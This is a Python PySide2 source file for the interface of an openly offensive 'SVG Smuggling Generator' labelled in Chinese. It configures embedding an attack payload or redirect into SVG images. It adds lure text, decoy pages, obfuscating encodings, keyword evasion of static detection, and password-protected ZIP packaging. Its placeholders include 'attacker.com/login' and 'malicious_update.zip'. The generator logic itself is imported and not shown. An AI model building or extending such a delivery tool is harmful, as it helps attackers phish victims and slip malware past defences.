import os
import webbrowser
from PySide2.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit, QPushButton, 
    QMessageBox, QComboBox, QFileDialog, QApplication, QGroupBox, QFormLayout, QCheckBox, QScrollArea, QFrame
)
from PySide2.QtCore import Qt
from generators.svg_generator import SVGGenerator
from utils.packaging import package_as_zip

class SVGTab(QWidget):
    def __init__(self):
        super().__init__()
        self.generator = SVGGenerator()
        self.generated_svg_path = None
        self.init_ui()

    def init_ui(self):
        main_layout = QVBoxLayout(self)
        main_layout.setContentsMargins(0, 0, 0, 0)
        
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        
        content_widget = QWidget()
        layout = QVBoxLayout(content_widget)
        layout.setSpacing(16)
        layout.setContentsMargins(10, 10, 10, 10)
        
        # --- Header Section ---
        header_layout = QVBoxLayout()
        header_layout.setSpacing(4)
        
        title_label = QLabel("SVG Smuggling Generator")
        title_label.setObjectName("titleLabel")
        header_layout.addWidget(title_label)
        
        subtitle_label = QLabel("将Payload或跳转逻辑嵌入SVG图像中，利用浏览器解析机制触发动作")
        subtitle_label.setObjectName("subtitleLabel")
        header_layout.addWidget(subtitle_label)
        
        layout.addLayout(header_layout)
        
        # --- Configuration Section ---
        config_group = QGroupBox("攻击配置")
        config_layout = QFormLayout()
        config_layout.setSpacing(12)
        
        # Mode Selector
        self.svg_mode_selector = QComboBox()
        self.svg_mode_selector.addItems([
            "点击下载模式 (Click to Download)", 
            "URL 跳转模式 (Click to Redirect)",
            "直连跳转模式 (Auto Redirect)",
            "SVG 走私模式 (JS Smuggling)"
        ])
        self.svg_mode_selector.currentIndexChanged.connect(self.on_mode_changed)
        config_layout.addRow(QLabel("投递模式 (Delivery Mode):"), self.svg_mode_selector)
        
        # Payload File
        self.svg_payload_input = QLineEdit()
        self.svg_payload_input.setPlaceholderText("点击右侧按钮选择要嵌入的攻击载荷文件...")
        self.svg_payload_browse_btn = QPushButton("📂 浏览")
        self.svg_payload_browse_btn.setFixedWidth(80)
        self.svg_payload_browse_btn.clicked.connect(self.select_payload_file)
        
        payload_layout = list_to_hbox([self.svg_payload_input, self.svg_payload_browse_btn])
        self.svg_payload_label = QLabel("攻击载荷 (Payload):")
        config_layout.addRow(self.svg_payload_label, payload_layout)
        
        # Download Filename
        self.svg_download_filename = QLineEdit()
        self.svg_download_filename.setPlaceholderText("例如：malicious_update.zip")
        self.svg_download_filename_label = QLabel("保存文件名 (Filename):")
        config_layout.addRow(self.svg_download_filename_label, self.svg_download_filename)
        
        # Target URL
        self.svg_target_url = QLineEdit()
        self.svg_target_url.setPlaceholderText("例如：https://attacker.com/login")
        self.svg_target_url_label = QLabel("目标 URL (Target):")
        config_layout.addRow(self.svg_target_url_label, self.svg_target_url)

        # Encoding Selector (New)
        self.svg_encoding_selector = QComboBox()
        self.svg_encoding_selector.addItems([
            "Standard Base64", 
            "Reverse + Base64", 
            "XOR + Base64", 
            "Chunked Shuffle + Base64"
        ])
        self.svg_encoding_label = QLabel("编码方式 (Encoding):")
        config_layout.addRow(self.svg_encoding_label, self.svg_encoding_selector)

        # Evasion Checkbox (New)
        self.svg_evasion_checkbox = QCheckBox("启用关键字混淆 (Keyword Evasion)")
        self.svg_evasion_checkbox.setToolTip("混淆敏感的 JavaScript 关键字以规避静态检测")
        self.svg_evasion_label = QLabel("静态规避 (Evasion):")
        config_layout.addRow("", self.svg_evasion_checkbox)

        # Decoy Template Selector (JS Smuggling only)
        self.svg_decoy_selector = QComboBox()
        self.svg_decoy_selector.addItems([
            "文档预览页面 (Document Viewer)",
            "安全验证页面 (Secure Transfer)"
        ])
        self.svg_decoy_label = QLabel("诱饵模板 (Decoy):")
        config_layout.addRow(self.svg_decoy_label, self.svg_decoy_selector)
        
        config_group.setLayout(config_layout)
        layout.addWidget(config_group)
        
        # --- Appearance Section ---
        appearance_group = QGroupBox("诱饵设置 (外观)")
        appearance_layout = QFormLayout()
        appearance_layout.setSpacing(12)
        
        # Bait Image
        self.svg_image_input = QLineEdit()
        self.svg_image_input.setPlaceholderText("留空则使用默认灰色占位图...")
        self.svg_image_browse_btn = QPushButton("📂 浏览")
        self.svg_image_browse_btn.setFixedWidth(80)
        self.svg_image_browse_btn.clicked.connect(self.select_image_file)
        
        image_layout = list_to_hbox([self.svg_image_input, self.svg_image_browse_btn])
        self.svg_image_label = QLabel("诱饵图片 (Bait Image):")
        appearance_layout.addRow(self.svg_image_label, image_layout)
        
        # Click Text
        self.svg_click_text = QLineEdit()
        self.svg_click_text.setText("安全扫描完成，请点击下载")
        self.svg_click_text_label = QLabel("诱导文本 (Click Text):")
        appearance_layout.addRow(self.svg_click_text_label, self.svg_click_text)
        
        appearance_group.setLayout(appearance_layout)
        self.appearance_group = appearance_group 
        layout.addWidget(appearance_group)

        # --- Packaging Section ---
        packaging_group = QGroupBox("打包选项 (Output Packaging)")
        packaging_layout = QFormLayout()
        packaging_layout.setSpacing(12)
        
        self.svg_package_selector = QComboBox()
        self.svg_package_selector.addItems(["不打包 (None)", "ZIP 压缩", "加密 ZIP (Password ZIP)"])
        self.svg_package_selector.currentIndexChanged.connect(self.on_package_changed)
        packaging_layout.addRow(QLabel("打包方式 (Format):"), self.svg_package_selector)
        
        self.svg_zip_password = QLineEdit()
        self.svg_zip_password.setEchoMode(QLineEdit.Password)
        self.svg_zip_password.setPlaceholderText("输入密码...")
        self.svg_zip_password_label = QLabel("解压密码 (Password):")
        packaging_layout.addRow(self.svg_zip_password_label, self.svg_zip_password)
        
        packaging_group.setLayout(packaging_layout)
        layout.addWidget(packaging_group)
        
        # --- Action Section ---
        btn_layout = QVBoxLayout()
        btn_layout.setSpacing(12)
        
        self.svg_generate_btn = QPushButton("🚀 生成 SVG 文件")
        self.svg_generate_btn.setObjectName("primaryButton")
        self.svg_generate_btn.clicked.connect(self.generate_svg)
        btn_layout.addWidget(self.svg_generate_btn)
        
        self.svg_open_btn = QPushButton("🔍 在浏览器中预览")
        self.svg_open_btn.setEnabled(False)
        self.svg_open_btn.clicked.connect(self.open_in_browser)
        btn_layout.addWidget(self.svg_open_btn)
        
        layout.addLayout(btn_layout)
        
        # --- Status Section ---
        self.svg_status = QLabel("")
        layout.addWidget(self.svg_status)
        
        # Initialize Visibility
        self.on_mode_changed(0)
        self.on_package_changed(0)
        
        layout.addStretch()
        
        scroll.setWidget(content_widget)
        main_layout.addWidget(scroll)

    def on_mode_changed(self, index):
        # 0: Download, 1: Redirect, 2: Auto Redirect, 3: JS Smuggling
        
        is_download = (index == 0)
        is_redirect = (index == 1 or index == 2)
        is_smuggling = (index == 3)
        
        show_payload = (is_download or is_smuggling)
        show_url = (is_redirect)
        show_appearance = (is_download or index == 1) # Redirect (Click) also shows appearance
        show_advanced = (is_smuggling) # Encoding/Evasion
        
        # Toggle fields visibility
        self.svg_payload_label.setVisible(show_payload)
        self.svg_payload_input.setVisible(show_payload)
        self.svg_payload_browse_btn.setVisible(show_payload)
        self.svg_download_filename_label.setVisible(show_payload)
        self.svg_download_filename.setVisible(show_payload)
        
        self.svg_target_url_label.setVisible(show_url)
        self.svg_target_url.setVisible(show_url)
        
        # Advanced options for Smuggling
        self.svg_encoding_label.setVisible(show_advanced)
        self.svg_encoding_selector.setVisible(show_advanced)
        self.svg_evasion_checkbox.setVisible(show_advanced)
        self.svg_decoy_label.setVisible(show_advanced)
        self.svg_decoy_selector.setVisible(show_advanced)
        
        # Toggle whole Appearance Group
        self.appearance_group.setVisible(show_appearance)
    
    def on_package_changed(self, index):
        mode = self.svg_package_selector.currentText()
        is_password = "Password" in mode or "加密" in mode
        
        self.svg_zip_password_label.setVisible(is_password)
        self.svg_zip_password.setVisible(is_password)

    def select_payload_file(self):
        path, _ = QFileDialog.getOpenFileName(self, "选择攻击载荷文件", "", "所有文件 (*)")
        if path:
            self.svg_payload_input.setText(path)

    def select_image_file(self):
        path, _ = QFileDialog.getOpenFileName(self, "选择诱饵图片文件", "", "图片文件 (*.jpg *.jpeg *.png *.gif *.bmp);;所有文件 (*)")
        if path:
            self.svg_image_input.setText(path)

    def generate_svg(self):
        mode = self.svg_mode_selector.currentText()
        package_mode = self.svg_package_selector.currentText()
        zip_password = self.svg_zip_password.text().strip()
        
        params = {
            'click_text': self.svg_click_text.text().strip(),
            'image_source': self.svg_image_input.text().strip()
        }
        
        if "点击下载模式" in mode:
            params['payload_path'] = self.svg_payload_input.text().strip()
            params['download_filename'] = self.svg_download_filename.text().strip()
            if not params['payload_path']:
                self.show_error("请选择攻击载荷文件")
                return
        
        elif "URL 跳转模式" in mode or "直连跳转模式" in mode:
             params['target_url'] = self.svg_target_url.text().strip()
             if not params['target_url']:
                self.show_error("请输入跳转 URL")
                return

        elif "JS" in mode or "Smuggling" in mode:
             params['payload_path'] = self.svg_payload_input.text().strip()
             params['download_filename'] = self.svg_download_filename.text().strip()
             params['encoding_method'] = self.svg_encoding_selector.currentText()
             params['enable_evasion'] = self.svg_evasion_checkbox.isChecked()
             decoy_idx = self.svg_decoy_selector.currentIndex()
             params['decoy_mode'] = 'template2' if decoy_idx == 1 else 'template1'
             
             if not params['payload_path']:
                self.show_error("请选择攻击载荷文件")
                return

        try:
            self.svg_status.setText("状态：正在生成...")
            self.svg_status.setStyleSheet("color: #a0a0a0;")
            QApplication.processEvents()

            default_filename = os.path.join("outputs", "svg_smuggling.svg")
            save_path, _ = QFileDialog.getSaveFileName(self, "保存 SVG 文件", default_filename, "SVG 文件 (*.svg);;所有文件 (*)")
            
            if not save_path:
                self.svg_status.setText("状态：取消保存")
                return

            abs_path = self.generator.generate(mode, params, save_path)
            final_msg = f"✅ SVG 生成成功: {abs_path}"

            # Packaging Logic
            if "None" not in package_mode and "不打包" not in package_mode:
                if "Password" in package_mode and not zip_password:
                     raise ValueError("Packaging Password is required.")
                
                svg_name = os.path.basename(abs_path)
                zip_name = os.path.splitext(svg_name)[0] + ".zip"
                
                zip_pwd = zip_password if "Password" in package_mode else None
                zip_path = package_as_zip([abs_path], zip_name, password=zip_pwd)
                
                final_msg += f"\n📦 Boxed in ZIP: {zip_path}"
                
            self.svg_status.setObjectName("statusSuccess")
            self.svg_status.setText(final_msg)
            self.svg_status.setStyleSheet("color: #00b894; font-weight: bold;")
            
            self.svg_open_btn.setEnabled(True)
            self.generated_svg_path = abs_path
            
            if self.window():
                self.window().statusBar().showMessage(f"Generated: {abs_path}")

        except Exception as e:
             self.show_error(f"生成/打包失败: {str(e)}")

    def show_error(self, message):
        self.svg_status.setObjectName("statusError")
        self.svg_status.setText(f"❌ {message}")
        self.svg_status.setStyleSheet("color: #e94560; font-weight: bold;")

    def open_in_browser(self):
        if self.generated_svg_path and os.path.exists(self.generated_svg_path):
            try:
                webbrowser.open_new_tab(f"file://{self.generated_svg_path}")
            except Exception as e:
                self.show_error(f"打开预览失败: {str(e)}")
        else:
            self.show_error("文件不存在")

# Helper to create QHBoxLayout inline
def list_to_hbox(widgets):
    from PySide2.QtWidgets import QHBoxLayout, QWidget
    w = QWidget()
    l = QHBoxLayout()
    l.setContentsMargins(0, 0, 0, 0)
    for widget in widgets:
        l.addWidget(widget)
    w.setLayout(l)
    return w
